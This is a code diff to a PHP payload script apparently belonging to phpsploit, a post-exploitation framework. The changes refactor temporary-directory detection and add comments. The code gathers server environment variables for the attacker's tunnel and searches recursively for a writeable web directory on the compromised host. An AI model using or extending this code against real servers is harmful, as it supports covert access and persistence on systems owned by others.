@@ -3,9 +3,13 @@
 !import(execute);
 !import(dirAccess);
 
+
+// determine temporary directory.
 function get_tmp_dir()
 {
-    if (!function_exists('sys_get_temp_dir'))
+    if (function_exists('sys_get_temp_dir'))
+        $t = @sys_get_temp_dir();
+    else
     {
         if (!empty($_ENV['TMP']))
             $t = $_ENV['TMP'];
@@ -21,13 +25,15 @@ function get_tmp_dir()
             $t = @dirname($t);
         }
     }
-    else
-        $t = @sys_get_temp_dir();
     return ($t);
 }
 
 
-// $R is the returned environment variables array
+// $R:
+// raw array of variables returned by the connector.
+// This array shall contain enough informations to
+// determine tunnel environment variables that
+// will be used by phpsploit for the created tunnel.
 $R = $_SERVER;
 
 $R['PHP_OS'] = PHP_OS;
@@ -66,7 +72,10 @@ if (!$R['WEB_ROOT'])
 $R['WEB_ROOT'] = @realpath($R['WEB_ROOT']);
 
 
-// Determine WRITEABLE_WEBDIR
+// Determine WRITEABLE_WEBDIR.
+// This code recursively browses subdirectories,
+// starting with the WEB_ROOT, and searching for the
+// writeable path which is the closest to WER_BOOT.
 $MAX_RECURSION = 6;
 $dir_list = Array($R['WEB_ROOT']);
 $R['WRITEABLE_WEBDIR'] = '';
